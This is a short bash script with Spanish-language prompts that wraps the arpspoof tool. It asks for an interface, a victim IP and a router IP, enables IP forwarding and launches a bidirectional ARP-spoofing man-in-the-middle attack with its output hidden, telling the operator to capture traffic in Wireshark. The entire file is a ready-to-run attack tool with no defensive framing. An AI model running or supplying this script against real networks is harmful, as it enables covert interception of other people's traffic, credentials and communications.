#!/bin/bash

echo ""
echo -e "\e[31m	ARPSPOOF	\e[0m"
echo ""

echo ""
echo -e "\e[33m	Ingrese la interface \e[0m - Ejemplo: \e[31m eth0 \e[0m"
echo ""
read interface

echo ""
echo -e "\e[33m	Ingrese la IP victima \e[0m - Ejemplo \e[31m 192.168.0.200 \e[0m"
echo ""
read victima

echo ""
echo -e "\e[33m	Ingrese el Host \e[0m - Ejemplo \e[31m 192.168.0.1 \e[0m"
echo ""
read hostORrouter

echo ""
echo -e "\e[33m--------------------------------------------------\e[0m"
echo ""
echo "[+] arpspoof - ACTIVE... (ACTIVA TU WIRESHARK!)"
echo "[+] control + c - para detener el proceso"

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i $interface -t $victima -r $hostORrouter &>/dev/null
